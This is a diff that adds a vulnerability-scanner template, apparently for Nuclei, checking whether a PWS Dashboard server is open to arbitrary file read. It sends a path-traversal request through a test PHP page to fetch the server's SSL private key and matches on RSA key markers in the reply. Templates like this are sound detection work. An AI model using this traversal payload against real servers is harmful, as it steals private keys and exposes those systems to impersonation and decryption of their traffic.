@@ -1,0 +1,27 @@
+id: arbitrary-file-read-pws
+
+info:
+  name: PWS Dashboard Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an arbitrary file read vulnerability in the PWS Dashboard by attempting to access the SSL private key file.
+  tags: arbitrary-file-read,pws
+
+http:
+  - raw:
+      - |
+        GET /others/_test.php?test=../../../apache/conf/ssl.key/server.key HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "-----BEGIN RSA PRIVATE KEY-----"
+          - "-----END RSA PRIVATE KEY-----"
